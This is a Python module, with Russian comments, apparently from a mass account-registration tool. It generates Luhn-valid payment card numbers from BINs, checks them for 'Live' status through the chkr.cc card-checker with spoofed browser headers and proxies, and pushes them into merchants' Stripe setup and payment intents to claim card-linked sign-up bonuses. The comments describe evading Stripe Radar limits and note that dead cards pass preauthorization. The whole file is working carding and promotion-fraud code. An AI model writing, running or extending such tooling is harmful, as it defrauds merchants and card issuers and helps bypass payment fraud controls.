# -*- coding: utf-8 -*-
"""cardkit — авто-бины/карты: генерация PAN по BIN, чек через chkr.cc, Stripe-оплата.

Зачем: у сервисов с шагом «привяжи карту → получи бонус» карта — узкое место.
Одна живая карта быстро выгорает (лимиты, Radar/риск), поэтому нужна пачка
валидных по Luhn карт из BIN и, если нужно, отсбор живых через чекер.

Часть 1 — ГЕНЕРАТОР ($0, офлайн, алгоритм chkr.cc):
    gen_card("52792622911")           → Card(52792622911xxxxx → 16 цифр)
    gen_card("52792622911xxxxxxxxx")  → своя маска, длина 16
    gen_card("461994")                → BIN + случайные цифры до Luhn
  * маска: цифры фиксированы, 'x' — случайная цифра;
  * длина: 15 для Amex (3xxx), иначе 16 (или длина маски, если она длиннее);
  * последняя 'x' заменяется контрольной цифрой Luhn — карта валидна всегда;
  * если последняя позиция фиксирована — перебор случайных до 500 попыток;
  * срок: текущий год + рандом из card_ttl_years (по умолчанию 2..5), CVV 3/4.

Часть 2 — ЧЕКЕР chkr.cc (POST https://api.chkr.cc/, тот же, что на сайте):
    check_card(card)   → {"code": 1|0|2, "status": "Live|Die|Unknown", ...}
  Между чеками пауза chkr_check_interval_sec (у веба 2.5 с). 429 — ждём
  retryAfter/Retry-After и повторяем. Origin/Referer chkr.cc обязательны,
  без браузерного UA прилетает 403.

Часть 3 — STRIPE без браузера (нужен pk_ мерчанта, publishable key):
    stripe_create_pm(pk, card)                          → PaymentMethod
    stripe_confirm_setup(client_secret, pk, card)       → SetupIntent
    stripe_confirm_payment(client_secret, pk, card)     → PaymentIntent
  Конфигурация карт — те же billing_details[address][postal_code] и т.п.
  Ошибки разворачиваются в читаемый текст stripe_error(resp).

Конфиг (config.json; все ключи опциональны, дефолты — в core/config.py):
    card_bins: ["52792622911", "461994"]  # список BIN/масок, выбор случайный
    card_bin_mode: "any" | "live" | "off"
        any  — берём первую сгенерированную (мёртвые карты проходят предавторизацию)
        live — гонять через chkr до Live (медленно, упирается в лимит API)
        off  — генератор выключен, используем фиксированную карту
    card_number / card_mm / card_yyyy / card_cvv — фиксированная карта (фолбэк)
    card_ttl_years: [2, 5]
    card_zip: "10001"                    # ZIP для billing_details
    chkr_api: "https://api.chkr.cc/"
    chkr_check_interval_sec: 2.5
    chkr_max_generate: 40                # максимум карт на подбор live

CLI (из папки реггера):
    python3 -m core.cardkit gen 5 --bin 52792622911
    python3 -m core.cardkit check "5279262291100000|12|2029|123"
    python3 -m core.cardkit pick --mode any
"""
import json
import random
import re
import time
from dataclasses import dataclass, field

import requests

try:
    from . import config
except ImportError:  # запуск как скрипт (python3 core/cardkit.py)
    config = None

CHKR_DEFAULT = "https://api.chkr.cc/"
STRIPE_API = "https://api.stripe.com/v1"

LIVE, DIE, UNKNOWN = 1, 0, 2

_DEFAULT_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36")


def _cfg(key, default=None):
    if config is not None:
        return config.get(key, default)
    return default


# ── Luhn ────────────────────────────────────────────────────────────────────

def luhn_ok(number):
    """True, если число проходит алгоритм Луна."""
    digits = re.sub(r"\D", "", str(number))
    if not digits:
        return False
    total, alt = 0, False
    for ch in reversed(digits):
        d = int(ch)
        if alt:
            d *= 2
            if d > 9:
                d -= 9
        total += d
        alt = not alt
    return total % 10 == 0


def luhn_check_digit(partial):
    """Контрольная цифра Luhn для неполного номера без последней цифры."""
    digits = re.sub(r"\D", "", str(partial))
    total, alt = 0, True
    for ch in reversed(digits):
        d = int(ch)
        if alt:
            d *= 2
            if d > 9:
                d -= 9
        total += d
        alt = not alt
    return str((10 - total % 10) % 10)


# ── карта ───────────────────────────────────────────────────────────────────

@dataclass
class Card:
    pan: str
    mm: str
    yyyy: str
    cvv: str
    bin: str = ""
    meta: dict = field(default_factory=dict)

    def line(self):
        """Формат chkr.cc: PAN|MM|YYYY|CVV."""
        return f"{self.pan}|{self.mm}|{self.yyyy}|{self.cvv}"

    def masked(self):
        return f"{self.pan[:6]}******{self.pan[-2:]}|{self.mm}/{self.yyyy}|cvv***"

    def to_dict(self):
        return {"pan": self.pan, "mm": self.mm, "yyyy": self.yyyy,
                "cvv": self.cvv, "bin": self.bin}

    @classmethod
    def parse(cls, line):
        """'PAN|MM|YYYY|CVV' → Card. Года 2 цифры → 20xx."""
        parts = [p.strip() for p in str(line).replace(",", "|").split("|")]
        if len(parts) < 4:
            raise ValueError(f"не разобрал карту: {line!r} (нужно PAN|MM|YYYY|CVV)")
        pan, mm, yy, cvv = parts[:4]
        if len(yy) == 2:
            yy = "20" + yy
        return cls(pan=re.sub(r"\D", "", pan), mm=mm.zfill(2), yyyy=yy, cvv=cvv)

    @classmethod
    def from_config(cls):
        """Фиксированная карта из card_number/card_mm/card_yyyy/card_cvv."""
        pan = _cfg("card_number") or ""
        if not pan:
            return None
        return cls(pan=re.sub(r"\D", "", str(pan)),
                   mm=str(_cfg("card_mm") or "12").zfill(2),
                   yyyy=str(_cfg("card_yyyy") or "2029"),
                   cvv=str(_cfg("card_cvv") or ""),
                   bin=re.sub(r"\D", "", str(pan))[:6])


# ── генератор ───────────────────────────────────────────────────────────────

def _normalize_mask(bin_str):
    s = re.sub(r"\s+", "", str(bin_str or ""))
    s = s.replace("X", "x").replace("?", "x").replace("*", "x")
    return re.sub(r"[^0-9x]", "", s)


def _pan_length(mask):
    if mask.startswith("3"):
        base = 15
    else:
        base = 16
    return max(base, len(mask))


def gen_pan(bin_mask, tries=500):
    """Сгенерировать PAN по BIN/маске, валидный по Luhn.

    Маска: цифры фиксированы, 'x' (или X/?/*) — случайная цифра. Хвост
    добивается случайными цифрами до стандартной длины (15 Amex / 16 иначе).
    """
    mask = _normalize_mask(bin_mask)
    if len(mask) < 6:
        raise ValueError(f"BIN/маска слишком короткая: {bin_mask!r} (нужно ≥6)")
    n = _pan_length(mask)
    mask = mask + "x" * (n - len(mask))
    # быстрый путь: последняя позиция свободна → ставим контрольную цифру Luhn
    if mask[-1] == "x":
        head = "".join(str(random.randint(0, 9)) if ch == "x" else ch for ch in mask[:-1])
        return head + luhn_check_digit(head)
    # последняя цифра зафиксирована — перебор (как в вебе chkr.cc, 500 попыток)
    for _ in range(tries):
        num = "".join(str(random.randint(0, 9)) if ch == "x" else ch for ch in mask)
        if luhn_ok(num):
            return num
    raise ValueError(f"не удалось собрать Luhn-валидный PAN по маске {bin_mask!r}")


def gen_card(bin_mask=None, mm=None, yyyy=None, cvv=None):
    """Готовая карта из BIN/маски. Пустой bin → random из config.card_bins."""
    if not bin_mask:
        bins = _cfg("card_bins") or []
        if not bins:
            raise ValueError("нет BIN: передай bin_mask или заполни card_bins в config.json")
        bin_mask = random.choice(bins)
    mm = mm if mm is not None else f"{random.randint(1, 12):02d}"
    if yyyy is None:
        ttl = _cfg("card_ttl_years") or [2, 5]
        lo, hi = (ttl[0], ttl[-1]) if isinstance(ttl, (list, tuple)) else (2, 5)
        yyyy = str(time.gmtime().tm_year + random.randint(lo, hi))
    pan = gen_pan(bin_mask)
    if cvv is None:
        cvv_len = 4 if pan.startswith("3") else 3
        tmp = _cfg("card_cvv_length")
        if tmp:
            cvv_len = int(tmp)
        cvv = "".join(str(random.randint(0, 9)) for _ in range(cvv_len))
    return Card(pan=pan, mm=str(mm).zfill(2), yyyy=str(yyyy),
                cvv=str(cvv), bin=_normalize_mask(bin_mask)[:8].replace("x", ""))


# ── чекер chkr.cc ──────────────────────────────────────────────────────────

def check_card(card, proxy=None, session=None, charge=False, timeout=40):
    """Проверить карту через api.chkr.cc.

    Возвращает dict: {code, status, message, bank, type, category, country, raw}.
    code: 1 Live, 0 Die, 2 Unknown. 429/403 не глотаются — в поле error.
    """
    api = _cfg("chkr_api") or CHKR_DEFAULT
    interval = float(_cfg("chkr_check_interval_sec") or 2.5)
    retries = int(_cfg("chkr_max_429_retries") or 3)
    data = card.line() if isinstance(card, Card) else str(card)
    s = session or requests.Session()
    headers = {
        "Content-Type": "application/json; charset=utf-8",
        "Origin": "https://chkr.cc",
        "Referer": "https://chkr.cc/",
        "User-Agent": _DEFAULT_UA,
    }
    last = {}
    for attempt in range(retries + 1):
        try:
            r = s.post(api, json={"data": data, "charge": bool(charge)},
                       headers=headers, timeout=timeout,
                       proxies={"http": proxy, "https": proxy} if proxy else None)
        except requests.RequestException as exc:
            return {"error": f"chkr: сеть {exc}", "raw": None}
        body = r.text[:300]
        if r.status_code == 403:
            return {"error": "chkr: 403 (Cloudflare) — проверь UA/Origin", "raw": body}
        if r.status_code == 429:
            wait = interval
            try:
                wait = float(r.headers.get("Retry-After") or 0) or interval
            except ValueError:
                pass
            try:
                wait = float(r.json().get("retryAfter") or wait)
            except ValueError:
                pass
            last = {"error": f"chkr: 429, ретрай {attempt + 1}/{retries}", "raw": body}
            if attempt < retries:
                time.sleep(max(wait, interval))
                continue
            return last
        if not r.ok:
            return {"error": f"chkr: HTTP {r.status_code}", "raw": body}
        try:
            j = r.json()
        except ValueError:
            return {"error": "chkr: не JSON", "raw": body}
        c = j.get("card") or {}
        country = c.get("country") or {}
        out = {
            "code": j.get("code"),
            "status": j.get("status"),
            "message": j.get("message"),
            "bank": c.get("bank"),
            "type": c.get("type"),
            "category": c.get("category"),
            "country": country.get("name"),
            "country_emoji": country.get("emoji"),
            "raw": j,
        }
        if attempt == 0 and interval > 0:
            time.sleep(interval)  # как в вебе: пауза между чеками
        return out
    return last or {"error": "chkr: не удалось"}


def is_live(result):
    return bool(result) and result.get("code") == LIVE


# ── высокоуровневый подбор ──────────────────────────────────────────────────

def pick_card(bins=None, mode=None, proxy=None, on_step=None, fixed=None):
    """Вернуть готовую карту по конфигу.

    mode=any  — первая сгенерированная (мёртвые карты проходят предавторизацию);
    mode=live — генерим и чекаем через chkr.cc, пока не найдём Live;
    mode=off  — генератор выключен (fixed / card_number из конфига).

    `fixed` — готовая Card/строка, имеет приоритет над генерацией.
    """
    def step(msg):
        if on_step:
            on_step(msg)

    if isinstance(fixed, str):
        fixed = Card.parse(fixed)
    if fixed is not None:
        step(f"карта: фиксированная {fixed.masked()}")
        return fixed

    mode = (mode or _cfg("card_bin_mode") or "any").lower()
    if mode == "off":
        card = Card.from_config()
        if not card:
            raise ValueError("card_bin_mode=off, но в конфиге нет card_number")
        step(f"карта: из конфига {card.masked()}")
        return card

    bins = bins or _cfg("card_bins") or []
    if not bins:
        card = Card.from_config()
        if card:
            step(f"карта: из конфига {card.masked()}")
            return card
        raise ValueError("нет card_bins и нет card_number в config.json")

    max_gen = int(_cfg("chkr_max_generate") or 40)
    for i in range(1, max_gen + 1):
        card = gen_card(random.choice(bins))
        if mode != "live":
            step(f"карта #{i}: сгенерирована {card.masked()} (режим any)")
            return card
        res = check_card(card, proxy=proxy)
        status = res.get("status") or res.get("error") or "?"
        step(f"карта #{i}: {card.masked()} → {status}")
        if is_live(res):
            card.meta["chkr"] = res
            return card
    raise RuntimeError(f"не нашёл Live-карту за {max_gen} попыток (mode=live)")


# ── Stripe (API без браузера) ──────────────────────────────────────────────

def _stripe_post(path, data, proxy=None, timeout=40, session=None):
    s = session or requests.Session()
    try:
        r = s.post(STRIPE_API + path, data=data, timeout=timeout,
                   headers={"User-Agent": _DEFAULT_UA},
                   proxies={"http": proxy, "https": proxy} if proxy else None)
    except requests.RequestException as exc:
        return {"error": {"message": f"stripe: сеть {exc}"}, "_http": None}
    try:
        j = r.json()
    except ValueError:
        j = {"error": {"message": r.text[:200]}}
    j["_http"] = r.status_code
    return j


def _card_fields(card, prefix="payment_method_data"):
    """Поля карты для Stripe API (расширение payment_method_data[card][...])."""
    return {f"{prefix}[type]": "card",
            f"{prefix}[card][number]": card.pan,
            f"{prefix}[card][exp_month]": card.mm,
            f"{prefix}[card][exp_year]": card.yyyy,
            f"{prefix}[card][cvc]": card.cvv}


def _billing_fields(card, prefix="payment_method_data", billing=None):
    billing = billing or {}
    out = {}
    zip_code = billing.get("zip") or _cfg("card_zip")
    if zip_code:
        out[f"{prefix}[billing_details][address][postal_code]"] = str(zip_code)
    if billing.get("country"):
        out[f"{prefix}[billing_details][address][country]"] = billing["country"]
    if billing.get("name"):
        out[f"{prefix}[billing_details][name]"] = billing["name"]
    return out


def stripe_create_pm(pk, card, billing=None, proxy=None, session=None):
    """POST /v1/payment_methods — проверить карту у мерчанта по pk_.

    Ответ с id=pm_… — карта прошла базовую проверку Stripe (Luhn/CVV и т.п.),
    ошибка — decline/риск. Это самый дешёвый способ отсеять мусор.

    ВАЖНО: многие мерчанты запрещают «publishable key tokenization» вне своих
    разрешённых поверхностей (ошибка `unsupported_publishable_key_tokenization_*`).
    Тогда карту можно провести только в браузере (Stripe Elements на домене мерчанта).
    """
    data = {"key": pk, "type": "card",
            "card[number]": card.pan,
            "card[exp_month]": card.mm,
            "card[exp_year]": card.yyyy,
            "card[cvc]": card.cvv}
    billing = dict(billing or {})
    zip_code = billing.get("zip") or _cfg("card_zip")
    if zip_code:
        data["billing_details[address][postal_code]"] = str(zip_code)
    if billing.get("country"):
        data["billing_details[address][country]"] = billing["country"]
    if billing.get("name"):
        data["billing_details[name]"] = billing["name"]
    return _stripe_post("/payment_methods", data, proxy=proxy, session=session)


def _confirm_intent(kind, client_secret, pk, card, zip_code=None, billing=None,
                    proxy=None, session=None):
    """kind: setup_intents | payment_intents. client_secret → id."""
    secret = str(client_secret or "")
    intent_id = secret.split("_secret_")[0]
    if not intent_id:
        return {"error": {"message": "пустой client_secret"}}
    billing = dict(billing or {})
    if zip_code and not billing.get("zip"):
        billing["zip"] = zip_code
    # Stripe требует client_secret в теле confirm (даже если он есть в пути).
    data = {"key": pk, "client_secret": secret}
    data.update(_card_fields(card))
    data.update(_billing_fields(card, billing=billing))
    data["payment_method_data[allow_redisplay]"] = "always"
    # у confirm можно и просто приложить pm_ из create_pm:
    #   payment_method=<pm_id> — но новый payment_method_data работает и так
    return _stripe_post(f"/{kind}/{intent_id}/confirm", data,
                        proxy=proxy, session=session)


def stripe_confirm_setup(client_secret, pk, card, **kw):
    """Подтвердить SetupIntent картой (привязка карты, $0/предавторизация)."""
    return _confirm_intent("setup_intents", client_secret, pk, card, **kw)


def stripe_confirm_payment(client_secret, pk, card, **kw):
    """Подтвердить PaymentIntent картой (списание, напр. $1-$2)."""
    return _confirm_intent("payment_intents", client_secret, pk, card, **kw)


def stripe_error(resp):
    """Человекочитаемая ошибка Stripe из ответа."""
    if not isinstance(resp, dict):
        return str(resp)
    err = resp.get("error")
    if isinstance(err, dict):
        code = err.get("decline_code") or err.get("code") or ""
        msg = err.get("message") or ""
        return f"{code}: {msg}".strip(": ") or "stripe error"
    if err:
        return str(err)
    return ""


# ── CLI ─────────────────────────────────────────────────────────────────────

def _main(argv=None):
    import argparse
    ap = argparse.ArgumentParser(description="cardkit: генерация/чек карт, Stripe")
    sub = ap.add_subparsers(dest="cmd", required=True)

    g = sub.add_parser("gen", help="сгенерировать карты по BIN/маске")
    g.add_argument("count", type=int, nargs="?", default=1)
    g.add_argument("--bin", default=None)
    g.add_argument("--mm", default=None)
    g.add_argument("--yyyy", default=None)
    g.add_argument("--cvv", default=None)

    c = sub.add_parser("check", help="проверить карту(ы) через chkr.cc")
    c.add_argument("lines", nargs="+", help='формула "PAN|MM|YYYY|CVV"')
    c.add_argument("--proxy", default=None)

    p = sub.add_parser("pick", help="подобрать карту по конфигу")
    p.add_argument("--mode", default=None, choices=["any", "live", "off"])
    p.add_argument("--bin", default=None)
    p.add_argument("--proxy", default=None)

    args = ap.parse_args(argv)
    if args.cmd == "gen":
        for _ in range(args.count):
            print(gen_card(args.bin, args.mm, args.yyyy, args.cvv).line())
    elif args.cmd == "check":
        for line in args.lines:
            card = Card.parse(line)
            res = check_card(card, proxy=args.proxy)
            print(json.dumps({"card": card.masked(), **res}, ensure_ascii=False))
    elif args.cmd == "pick":
        card = pick_card(bins=[args.bin] if args.bin else None,
                         mode=args.mode, proxy=args.proxy, on_step=print)
        print("CARD:", card.line())
    return 0


if __name__ == "__main__":
    raise SystemExit(_main())
